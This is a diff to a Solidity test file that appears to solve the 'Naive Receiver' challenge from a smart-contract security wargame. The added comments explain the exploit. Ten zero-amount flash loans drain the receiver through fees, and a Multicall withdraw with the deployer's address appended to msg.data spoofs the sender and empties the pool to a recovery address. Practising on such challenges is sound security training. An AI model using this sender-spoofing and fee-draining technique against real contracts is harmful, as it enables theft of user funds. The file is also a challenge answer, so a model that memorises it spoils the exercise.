@@ -77,10 +77,13 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        //Withdrawing all the receiver funds by taking out a flash loan of 0 amount - 10 times.
         bytes[] memory calldatas = new bytes[](11);
         for(uint256 i = 0 ; i < 10 ; i++){
             calldatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan,(receiver, address(weth), 0,""));
         }
+        // calling up the withdraw() to take out all the funds from pool contract.
+        // manipulating msg.data for withdraw to read deployer as msg.sender
         calldatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), deployer);
         bytes memory data = abi.encodeCall(Multicall.multicall,(calldatas));
 
